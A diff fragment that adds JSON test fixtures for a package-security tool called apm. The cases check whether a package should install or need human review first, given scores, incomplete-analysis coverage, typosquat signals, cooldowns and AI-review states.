+          "dependencies": "complete"
+        },
+        "notes": []
+      }
+    },
+    {
+      "name": "review of abcbb18: an open AI flag whose findings the registry withholds says so, never 0 findings",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "under-review",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: the AI review flagged it and a person at apm has not decided yet. It passes apm's install policy and scores 100/100 (A).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": [],
+        "reasons": [
+          "The AI review flagged this version; its findings are withheld until a person at apm reviews them."
+        ]
+      }
+    },
+    {
+      "name": "review of 307521b: express's safer-buffer, a look-alike name on the audited established list, installs",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "risks": [
+          {
+            "name": "safer-buffer",
+            "version": "2.1.2",
+            "via": [
+              "x@1.0.0"
+            ],
+            "scorer": "apm-score-v10",
+            "score": 80,
+            "signals": [
+              {
+                "id": "typosquat",
+                "points": -20
+              }
+            ]
+          }
+        ]
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "install",
+        "commands": true,
+        "summary": "x@1.0.0 passes apm's checks: it scores 100/100 (A), is past the 24-hour cooldown, nothing in its dependency tree was refused or flagged, and apm scored every dependency.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": []
+      }
+    },
+    {
+      "name": "review of 307521b: a dependency with a look-alike name that is not an established one is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "risks": [
+          {
+            "name": "lodahs",
+            "version": "1.0.0",
+            "via": [
+              "x@1.0.0"
+            ],
+            "scorer": "apm-score-v10",
+            "score": 80,
+            "signals": [
+              {
+                "id": "typosquat",
+                "points": -20
+              }
+            ]
+          }
+        ]
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: it brings in 1 dependency apm flagged for a risk signal or a score under 40. It passes apm's install policy and scores 100/100 (A).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": []
+      }
+    },
+    {
+      "name": "review of 7750559: a whole-flow stop in the version: review first, with the stop as the reason",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 39,
+        "lost": [
+          {
+            "id": "incomplete",
+            "label": "Some code that runs was too large to analyze, so this version is unverified",
+            "points": -61,
+            "evidence": [
+              "index.js: apm could not finish tracing where values go in this file",
+              "index.js:1:  (apm stopped following where values go at its work budget (64 million steps))"
+            ]
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm could not fully analyse it (it scores 39/100 (C)). It passes apm's install policy.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": [],
+        "reasons": [
+          "apm could not fully analyse it: `index.js: apm could not finish tracing where values go in this file`."
+        ]
+      }
+    },
+    {
+      "name": "review of 7750559: a dependency warned incomplete after a whole-flow stop: review first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [
+          {
+            "name": "stopped-dep",
+            "version": "1.0.0",
+            "kind": "incomplete",
+            "text": "apm could not fully analyse it (scores 39/100, F)",
+            "score": 39,
+            "signals": [
+              {
+                "id": "incomplete",
+                "points": -61
+              }
+            ],
+            "via": [
+              "x@1.0.0"
+            ]
+          }
+        ],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: it brings in 1 dependency apm could not fully analyse or score. It passes apm's install policy and scores 100/100 (A).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": []
+      }
+    },
+    {
+      "name": "review of c456c92, finding 1: a parser limit (5,000 nested parens) makes the analysis incomplete with no flow stop: review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 39,
+        "lost": [
+          {
+            "label": "Some code that runs was too large to analyze, so this version is unverified",
+            "points": -61,
+            "id": "incomplete",
+            "evidence": [
+              "index.js:1: ((((… (the file nests too deeply for apm to read as a tree (the reading ran out of stack), so where its values go was not followed; its text rules still counted)"
+            ]
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "coverage": {
+          "kind": "complete"
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm could not fully analyse it (it scores 39/100 (C)). It passes apm's install policy.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "reasons": [
+          "apm could not fully analyse it: `index.js:1: ((((… (the file nests too deeply for apm to read as a tree (the reading ran out of stack), so where its values go was not followed; its text rules still counted)`.",
+          "Some code that runs was too large to analyze, so this version is unverified (-61 points)."
+        ]
+      }
+    },
+    {
+      "name": "review of c456c92, finding 1: a parser limit (240,001 statements, past the token cap) with no flow stop: review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 39,
+        "lost": [
+          {
+            "label": "Some code that runs was too large to analyze, so this version is unverified",
+            "points": -61,
+            "id": "incomplete",
+            "evidence": [
+              "index.js:1: 0;0;0;… (the file is too large for apm to read as a tree (more than 480000 tokens, or 1 MB of TypeScript), so where its values go was not followed; its text rules still counted)"
+            ]
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "coverage": {
+          "kind": "complete"
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm could not fully analyse it (it scores 39/100 (C)). It passes apm's install policy.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "reasons": [
+          "apm could not fully analyse it: `index.js:1: 0;0;0;… (the file is too large for apm to read as a tree (more than 480000 tokens, or 1 MB of TypeScript), so where its values go was not followed; its text rules still counted)`.",
+          "Some code that runs was too large to analyze, so this version is unverified (-61 points)."
+        ]
+      }
+    },
+    {
+      "name": "review of c456c92, finding 2: a reduced retry that read at most 4 MB is incomplete beside its byte-budget omission: review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 39,
+        "lost": [
+          {
+            "label": "Some code that runs was too large to analyze, so this version is unverified",
+            "points": -61,
+            "id": "incomplete",
+            "evidence": [
+              "2 earlier analyses of this version were stopped by the platform before they stored anything, so this one read at most 4 MB"
+            ]
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "coverage": {
+          "kind": "partial",
+          "omittedFiles": 1,
+          "omittedBytes": 4195665,
+          "reasons": [
+            "over-budget"
+          ],
+          "notes": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm could not fully analyse it (it scores 39/100 (C)). It passes apm's install policy.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "reasons": [
+          "apm could not fully analyse it: `2 earlier analyses of this version were stopped by the platform before they stored anything, so this one read at most 4 MB`.",
+          "Some code that runs was too large to analyze, so this version is unverified (-61 points)."
+        ]
+      }
+    },
+    {
+      "name": "review of c456c92, finding 2: a version past the analysis limit on every run (terminal analysis-limit) is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": null,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "warnings": [
+          {
+            "name": "x",
+            "version": "1.0.0",
+            "kind": "unscorable",
+            "unscorable": "analysis-limit",
+            "text": "apm cannot score this version: its analysis ran past the limits apm allows (3 runs failed)",
+            "via": []
+          }
+        ]
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm cannot score it, so nothing has read its code. It passes apm's install policy and has no score yet.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "reasons": [
+          "The registry said: `apm cannot score this version: its analysis ran past the limits apm allows (3 runs failed)`",
+          "The AI review found nothing in the files it read."
+        ]
+      }
+    },
+    {
+      "name": "review of c456c92, finding 3: a package published on apm keeps its apm-score-v11 report, incomplete with no flow stop (the two-parser fixture): review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 39,
+        "lost": [
+          {
+            "label": "Some code that runs was too large to analyze, so this version is unverified",
+            "points": -61,
+            "id": "incomplete",
+            "evidence": [
+              "index.ts:1:  (the file is too large for apm to read as a tree (more than 480000 tokens, or 1 MB of TypeScript), so where its values go was not followed; its text rules still counted)"
+            ]
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "coverage": {
+          "kind": "complete"
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm could not fully analyse it (it scores 39/100 (C)). It passes apm's install policy.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "reasons": [
+          "apm could not fully analyse it: `index.ts:1: (the file is too large for apm to read as a tree (more than 480000 tokens, or 1 MB of TypeScript), so where its values go was not followed; its text rules still counted)`.",
+          "Some code that runs was too large to analyze, so this version is unverified (-61 points)."
+        ]
+      }
+    },
+    {
+      "name": "review of c456c92, finding 3: a package published on apm under apm-score-v10, incomplete and with no coverage recorded: review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 39,
+        "lost": [
+          {
+            "label": "Some code that runs was too large to analyze, so this version is unverified",
+            "points": -61,
+            "id": "incomplete",
+            "evidence": [
+              "not analyzed: big.js (34.0 MB, over the 32 MB limit)"
+            ]
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "scorer": "apm-score-v10",
+        "coverage": null
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm could not fully analyse it (it scores 39/100 (C)). It passes apm's install policy.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "reasons": [
+          "apm could not fully analyse it: `not analyzed: big.js (34.0 MB, over the 32 MB limit)`.",
+          "Some code that runs was too large to analyze, so this version is unverified (-61 points)."
+        ]
+      }
+    },
+    {
+      "name": "review of c456c92, finding 4: the work meter out with no file left unread (coverage stopped): review-first, never P",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 39,
+        "lost": [
+          {
+            "label": "Some code that runs was too large to analyze, so this version is unverified",
+            "points": -61,
+            "id": "incomplete",
+            "evidence": [
+              "analysis work limit: apm stopped reading this version while scoring, at the 100 units one analysis may spend, so nothing it holds was cleared"
+            ]
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "coverage": {
+          "kind": "partial",
+          "omittedFiles": 2,
+          "omittedBytes": 89,
+          "reasons": [
+            "stopped"
+          ],
+          "notes": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm could not fully analyse it (it scores 39/100 (C)). It passes apm's install policy.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "reasons": [
+          "apm could not fully analyse it: `analysis work limit: apm stopped reading this version while scoring, at the 100 units one analysis may spend, so nothing it holds was cleared`.",
+          "Some code that runs was too large to analyze, so this version is unverified (-61 points)."
+        ]
+      }
+    },
+    {
+      "name": "fail-closed: next's size omissions alone (too-large and over-budget, apm-score-v11) install, graded P, with the counts",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 98,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "partial": {
+          "omittedFiles": 2656,
+          "omittedBytes": 74038961
+        },
+        "coverage": {
+          "kind": "partial",
+          "omittedFiles": 2656,
+          "omittedBytes": 74038961,
+          "reasons": [
+            "too-large",
+            "over-budget"
+          ],
+          "notes": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "install",
+        "commands": true,
+        "summary": "Install x@1.0.0: it scores 98/100 (P) and nothing apm found needs a person to look first, but apm read only part of x@1.0.0: 2,656 files (74.0 MB) not read, left unread for their size or its byte budget.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": [
+          {
+            "kind": "partial-analysis",
+            "text": "apm read only part of x@1.0.0: 2,656 files (74.0 MB) not read, past the size apm reads of one file or the bytes one analysis reads. It scores 98/100 (P) on the code it read."
+          }
+        ],
+        "reasons": [
+          "The AI review found nothing in the files it read."
+        ]
+      }
+    },
+    {
+      "name": "fail-closed: a partial reading an earlier scorer recorded is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 98,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "scorer": "apm-score-v10",
+        "coverage": {
+          "kind": "partial",
+          "omittedFiles": 2656,
+          "omittedBytes": 74038961,
+          "reasons": [
+            "over-budget"
+          ],
+          "notes": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm could not fully analyse it (it scores 98/100 (A)). It passes apm's install policy.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "reasons": [
+          "apm could not fully analyse it, and its analysis does not record that the only gap is files left unread for their size.",
+          "The AI review found nothing in the files it read."
+        ]
+      }
+    },
+    {
+      "name": "fail-closed: a partial reading from a registry that does not say its scorer is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 98,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "scorer": null,
+        "coverage": {
+          "kind": "partial",
+          "omittedFiles": 2656,
+          "omittedBytes": 74038961,
+          "reasons": [
+            "over-budget"
+          ],
+          "notes": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm could not fully analyse it (it scores 98/100 (A)). It passes apm's install policy.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "reasons": [
+          "apm could not fully analyse it, and its analysis does not record that the only gap is files left unread for their size.",
+          "The AI review found nothing in the files it read."
+        ]
+      }
+    },
+    {
+      "name": "fail-closed: a partial reading whose list of reasons is empty is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 98,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "coverage": {
+          "kind": "partial",
+          "omittedFiles": 2656,
+          "omittedBytes": 74038961,
+          "reasons": [],
+          "notes": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm could not fully analyse it (it scores 98/100 (A)). It passes apm's install policy.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "reasons": [
+          "apm could not fully analyse it, and its analysis does not record that the only gap is files left unread for their size.",
+          "The AI review found nothing in the files it read."
+        ]
+      }
+    },
+    {
+      "name": "fail-closed: a partial reading with a reason apm does not know is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 98,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "coverage": {
+          "kind": "partial",
+          "omittedFiles": 2656,
+          "omittedBytes": 74038961,
+          "reasons": [
+            "over-budget",
+            "new-reason"
+          ],
+          "notes": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm could not fully analyse it (it scores 98/100 (A)). It passes apm's install policy.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "reasons": [
+          "apm could not fully analyse it, and its analysis does not record that the only gap is files left unread for their size.",
+          "The AI review found nothing in the files it read."
+        ]
+      }
+    },
+    {
+      "name": "fail-closed: a partial reading whose reasons are malformed is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 98,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "coverage": {
+          "kind": "partial",
+          "omittedFiles": 2656,
+          "omittedBytes": 74038961,
+          "reasons": "over-budget"
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm could not fully analyse it (it scores 98/100 (A)). It passes apm's install policy.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "reasons": [
+          "apm could not fully analyse it, and its analysis does not record that the only gap is files left unread for their size.",
+          "The AI review found nothing in the files it read."
+        ]
+      }
+    },
+    {
+      "name": "fail-closed: an apm-score-v11 report with no coverage at all is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 98,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "coverage": null
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm could not fully analyse it (it scores 98/100 (A)). It passes apm's install policy.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "reasons": [
+          "apm could not fully analyse it, and its analysis does not record that the only gap is files left unread for their size.",
+          "The AI review found nothing in the files it read."
+        ]
+      }
+    },
+    {
+      "name": "fail-closed: a dependency read only in part for its size, on its own apm-score-v11 record, is a note",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "warnings": [
+          {
+            "name": "big-dep",
+            "version": "2.0.0",
+            "via": [
+              "x@1.0.0"
+            ],
+            "kind": "incomplete",
+            "text": "apm read only part of it: 2,656 files (74.0 MB) not read (scores 98/100 on what it read)",
+            "score": 98,
+            "signals": [],
+            "scorer": "apm-score-v11",
+            "coverage": {
+              "kind": "partial",
+              "omittedFiles": 2656,
+              "omittedBytes": 74038961,
+              "reasons": [
+                "too-large"
+              ],
+              "notes": []
+            }
+          }
+        ]
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "install",
+        "commands": true,
+        "summary": "Install x@1.0.0: it scores 100/100 (A) and nothing apm found needs a person to look first, but apm could not fully check some of its dependencies.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": [
+          {
+            "kind": "dependency-gaps",
+            "text": "apm could not fully check 1 dependency: `big-dep@2.0.0: apm read only part of it: 2,656 files (74.0 MB) not read (scores 98/100 on what it read)`."
+          }
+        ],
+        "reasons": [
+          "The AI review found nothing in the files it read."
+        ]
+      }
+    },
+    {
+      "name": "fail-closed: a dependency read only in part with no coverage on its warning (an older registry) is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "warnings": [
+          {
+            "name": "big-dep",
+            "version": "2.0.0",
+            "via": [
+              "x@1.0.0"
+            ],
+            "kind": "incomplete",
+            "text": "apm read only part of it: 2,656 files (74.0 MB) not read (scores 98/100 on what it read)",
+            "score": 98,
+            "signals": [],
+            "scorer": "apm-score-v11"
+          }
+        ]
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: it brings in 1 dependency apm could not fully analyse or score. It passes apm's install policy and scores 100/100 (A).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "reasons": [
+          "apm could not fully analyse or score 1 dependency: `big-dep@2.0.0: apm read only part of it: 2,656 files (74.0 MB) not read (scores 98/100 on what it read)`.",
+          "The AI review found nothing in the files it read."
+        ]
+      }
+    },
+    {
+      "name": "fail-closed: a dependency past the analysis limit is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "warnings": [
+          {
+            "name": "slow-dep",
+            "version": "1.0.0",
+            "via": [
+              "x@1.0.0"
+            ],
+            "kind": "unscorable",
+            "unscorable": "analysis-limit",
+            "text": "apm cannot score this version: its analysis ran past the limits apm allows"
+          }
+        ]
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: it brings in 1 dependency apm could not fully analyse or score. It passes apm's install policy and scores 100/100 (A).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "reasons": [
+          "apm could not fully analyse or score 1 dependency: `slow-dep@1.0.0: apm cannot score this version: its analysis ran past the limits apm allows`.",
+          "The AI review found nothing in the files it read."
+        ]
+      }
+    },
+    {
+      "name": "fail-closed: a dependency inside the cooldown whose analysis is incomplete is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "warnings": [
+          {
+            "name": "fresh-dep",
+            "version": "1.0.0",
+            "via": [
+              "x@1.0.0"
+            ],
+            "kind": "cooldown",
+            "text": "published 2 hours ago, inside apm's 24-hour cooldown",
+            "signals": [
+              {
+                "id": "incomplete",
+                "points": -61
+              }
+            ],
+            "scorer": "apm-score-v11",
+            "coverage": {
+              "kind": "complete"
+            }
+          }
+        ]
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: it brings in 1 dependency published inside apm's 24-hour cooldown with no score apm could check. It passes apm's install policy and scores 100/100 (A).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "reasons": [
+          "Published inside the cooldown, with no score apm could check for a risk: `fresh-dep@1.0.0: published 2 hours ago, inside apm's 24-hour cooldown`.",
+          "The AI review found nothing in the files it read."
+        ]
       }
     }
   ]
